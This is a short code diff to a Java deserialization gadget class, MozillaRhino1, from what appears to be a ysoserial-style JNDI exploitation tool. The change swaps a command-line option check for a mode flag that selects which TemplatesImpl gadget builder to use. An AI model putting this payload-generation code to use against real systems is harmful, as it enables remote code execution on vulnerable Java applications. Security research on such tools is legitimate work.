@@ -16,6 +16,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /*
@@ -57,7 +58,7 @@ public class MozillaRhino1 implements ObjectPayload<Object>{
         getter.set(slot, memberboxes);
 
         final Object tpl;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             tpl = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             tpl = Gadgets.createTemplatesImpl(type, param);
